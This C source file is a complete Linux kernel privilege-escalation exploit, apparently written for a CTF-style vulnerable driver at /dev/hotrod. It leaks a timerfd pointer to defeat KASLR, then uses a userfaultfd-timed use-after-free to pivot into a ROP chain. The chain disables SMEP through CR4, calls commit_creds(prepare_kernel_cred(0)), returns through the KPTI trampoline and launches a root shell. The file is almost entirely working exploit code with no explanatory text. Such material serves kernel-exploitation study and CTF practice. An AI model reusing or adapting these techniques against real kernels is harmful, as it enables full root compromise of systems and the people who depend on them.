// gcc -o exp_nosmap exp_nosmap.c -masm=intel -static -s -lpthread
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <sys/timerfd.h>

#define ALLOC 0xBAADC0DE
#define FREE 0xC001C0DE
#define SHOW 0x1337C0DE
#define EDIT 0xDEADC0DE

#define PAGE_SIZE 0x1000
#define ADDRESS_PAGE_FAULT 0x1337000

static int fd, ufd;
static unsigned char buff[0xf0];
static unsigned long size = 0xf0;
static void *page;

unsigned long kernel_base;
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long pivot;
unsigned long native_write_cr4;

unsigned long usr_cs, usr_ss, usr_rflags, usr_rsp;

struct request
{
    unsigned char *buff;
    unsigned long size;
};

void hexdump(unsigned char *buff, unsigned long size)
{
    int i,j;

    for (i = 0; i < size/8; i++)
    {
        if ((i % 2) == 0)
        {
            if (i != 0)
                printf("  \n");

            printf("  %04x  ", i*8);
        }

        unsigned long ptr = ((unsigned long *)(buff))[i];
        printf("0x%016lx", ptr);
        printf("    ");

    }
    printf("\n");
}

static void save_state()
{
	__asm__ __volatile__(
	"movq %0, cs;"
	"movq %1, ss;"
	"pushfq;"
	"popq %2;"
        "movq %3, %%rsp\n"
	: "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags), "=r" (usr_rsp) : : "memory" );
}

static void do_nothing(void)
{
	return;
}

void getRootShell()
{
    if(getuid())
    {
        printf("[-] Failed to get a root");
        exit(0);
    }

    printf("[+] uid : %d\n", getuid());
    printf("[+] Got root.\n");

    execl("/bin/sh", "sh", NULL);
}

void do_alloc(unsigned long size)
{
    ioctl(fd, ALLOC, size);
}

void do_free(int fd)
{
    ioctl(fd, FREE);
}

void do_show(unsigned char *dest, unsigned long size)
{
    struct request req;

    req.size = size;
    req.buff = dest;

    ioctl(fd, SHOW, &req);
}

void do_edit(unsigned char *src, unsigned long size)
{
    struct request req;

    req.size = size;
    req.buff = src;

    ioctl(fd, EDIT, &req);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

int register_userfaultfd(uint64_t *range)
{
    int uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register reg;
    
    if ((uffd = userfaultfd(__O_CLOEXEC | O_NONBLOCK)) == -1)
    {
        perror("[ERROR] Userfaultfd failed");
        exit(-1);
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;

    if (ioctl(uffd, UFFDIO_API, &uffdio_api))
    {
        perror("[ERROR] ioctl - UFFDIO_API failed");
        exit(-1);
    }

    if (uffdio_api.api != UFFD_API)
    {
        puts("[ERROR] Unexepcted UFFD api version!");
        exit(-1);
    }

    printf("[*] Start monitoring range: %p - %p\n", page, page + PAGE_SIZE);

    reg.range.start = (uint64_t) range;
    reg.range.len = PAGE_SIZE;
    reg.mode = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER,  &reg))
    {
        perror("[ERROR] ioctl - UFFDIO_REGISTER failed");
        exit(-1);
    }

    return uffd;
}

void *handler_userfaultfd(void *args)
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;
    struct uffdio_copy ufd_copy;

    int uffd = *((int *) args);

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0)
    {
        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            perror("[ERROR] Polling failed");
            exit(-1);
        }

        if (read(uffd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
        {
            perror("[ERROR] Read - fault_msg failed");
            exit(-1);
        }

        char *page_fault_location = (char *)fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != page && page_fault_location != page + PAGE_SIZE))
        {
            perror("[ERROR] Unexpected pagefault?");
            exit(-1);
        }

        if (page_fault_location == (void *)0x1337000)
        {
            printf("[+] Page fault at address %p!\n", page_fault_location);
            do_free(fd);
            
            create_timer(0);

            void *fake_stack = mmap((void *)0xdead000, PAGE_SIZE * 5, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_POPULATE|MAP_PRIVATE, 0, 0);

            ((unsigned long *)(buff))[0x0] = (unsigned long)(fake_stack + 0x1000);
            ((unsigned long *)(buff))[0x3] = 0x000000000eae0e65;
            ((unsigned long *)(buff))[0x4] = 0x000000000eae0e65;
            ((unsigned long *)(buff))[0x5] = (unsigned long)(pivot);

            uint64_t *rop = (uint64_t *)(fake_stack + 0x1000);
            int k = 0;

            rop[k++] = kernel_base + 0xffffffff81027b8eUL; // mov rax, rdi; ret;
            rop[k++] = kernel_base + 0xffffffff8106e24aUL; // mov rsi, rax; sub rsi, rcx; cmp rdx, rax; cmovs r8, rsi; mov rax, r8; ret;
            rop[k++] = kernel_base + 0xffffffff81027b8eUL; // mov rax, rdi; ret;
            rop[k++] = kernel_base + 0xffffffff810f6180UL; // mov qword ptr [rax], rsi; ret;

            // Fix idx 0x5
            rop[k++] = kernel_base + 0xffffffff8113f9b6UL; // pop rdx; ret;
            rop[k++] = 0x28;
            rop[k++] = kernel_base + 0xffffffff81012183UL; // add rax, rdx; ret;
            rop[k++] = kernel_base + 0xffffffff81005b00UL; // pop rsi; ret;
            rop[k++] = kernel_base + 0xffffffff810001dcUL; // ret;
            rop[k++] = kernel_base + 0xffffffff810f6180UL; // mov qword ptr [rax], rsi; ret;

            rop[k++] = kernel_base + 0xffffffff810b689dUL; // pop rdi; ret;
            rop[k++] = 0x6f0;
            rop[k++] = native_write_cr4;

            // commit_creds(prepare_kernel_cred(0))
            rop[k++] = kernel_base + 0xffffffff810b689dUL; // pop rdi; ret;
            rop[k++] = 0x0; // rdi <- 0
            rop[k++] = prepare_kernel_cred;
            rop[k++] = kernel_base + 0xffffffff8108bacaUL; // mov rdi, rax; call 0x2d1350; mov rax, -9; pop rbp; ret;
            rop[k++] = 0x0;
            rop[k++] = commit_creds;
            rop[k++] = kernel_base + 0xffffffff81200d6cUL; // swapgs; pop rbp; ret;
            rop[k++] = 0x0;

            // pkc -> cc -> kpti trampoline -> userspace -> ret
            rop[k++] = kernel_base + 0xffffffff810b689dUL; // pop rdi; ret;
            rop[k++] = 0;
            rop[k++] = kernel_base + 0xffffffff81053680UL; // pkc
            rop[k++] = kernel_base + 0xffffffff8108bacaUL; // mov rdi, rax; call 0x2d1350; mov rax, -9; pop rbp; ret;
            rop[k++] = 0;
            rop[k++] = kernel_base + 0xffffffff810537d0UL; // cc
            rop[k++] = kernel_base + 0xffffffff8118a8d3UL; // pop rcx; ret;
            rop[k++] = (unsigned long)(do_nothing); // return
            rop[k++] = kernel_base + 0xffffffff81008b7dUL; // pop r11; pop r12; pop rbp; ret;
            rop[k++] = usr_rflags;
            rop[k++] = 0; // r12
            rop[k++] = 0; // rbp
            rop[k++] = kernel_base + 0xffffffff81200106UL; // kpti_trampoline (sysret)
            rop[k++] = 0; // rax
            rop[k++] = 0; // rdi
            rop[k++] = (unsigned long)(fake_stack + 0x1128);

            rop[k++] = (unsigned long)&getRootShell;
            rop[k++] = (unsigned long)usr_cs;
            rop[k++] = (unsigned long)usr_rflags;
            rop[k++] = (unsigned long)usr_rsp;
            rop[k++] = (unsigned long)usr_ss;

            //hexdump(buff, size);

            sleep(1);

            ufd_copy.dst = (unsigned long)0x1337000;
            ufd_copy.src = (unsigned long)(&buff);
            ufd_copy.len = PAGE_SIZE;
            ufd_copy.mode = 0;
            ufd_copy.copy = 0;

            if (ioctl(uffd, UFFDIO_COPY, &ufd_copy) < 0)
            {
                perror("ioctl(UFFDIO_COPY)");
                exit(-1);
            }

            exit(0);
        }
    }
}

int create_timer(int leak)
{
    struct itimerspec its;

    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = 10;
    its.it_value.tv_nsec = 0;

    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &its, 0);

    if (leak)
    {
        close(tfd);
        sleep(1);
        return 0;
    }
}

int main(void)
{
    pthread_t tid;

    fd = open("/dev/hotrod", O_RDONLY);

    if(fd < 0)
    {
        perror("[-] /dev/hotrod open failed");
    }

    puts("[+] Open /dev/hotrod");

    save_state();

    create_timer(1);

    page = mmap((void *)0x1336000, PAGE_SIZE * 2, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    puts("[+] Mapping two pages");

    do_alloc(size); // kmalloc-256
    puts("[+] Create Object in kmalloc-256");

    do_show(buff, size);
    
    //hexdump(buff, size);

    unsigned long timerfd_tmrproc = ((unsigned long *)(buff))[0x5];
    kernel_base = timerfd_tmrproc - 0x81102a00UL + 0x100000000UL;
    pivot = kernel_base + 0xffffffff81027b86; // mov esp, dword ptr [rdi]; lea rax, [rax + rsi*8]; ret;
    prepare_kernel_cred = (0xffffffff00000000UL + kernel_base) + 0x81053680;
    commit_creds = (0xffffffff00000000UL + kernel_base) + 0x810537d0;
    native_write_cr4 = (0xffffffff00000000UL + kernel_base) + 0x8101d220;

    printf("[+] Leak timerfd_tmrproc : 0x%lx\n", timerfd_tmrproc);
    printf("[+] Kernel base address: 0x%lx\n", (0xffffffff00000000UL + kernel_base));
    printf("[+] prepare_kernel_cred address: 0x%lx\n", prepare_kernel_cred);
    printf("[+] commit_creds address: 0x%lx\n", commit_creds);

    int ufd = register_userfaultfd((uint64_t *) ADDRESS_PAGE_FAULT);
    pthread_create(&tid, NULL, handler_userfaultfd, &ufd);

    puts("[*] Triggering page fault...");
    do_edit(page + PAGE_SIZE, size);

    pthread_join(tid, NULL);
}
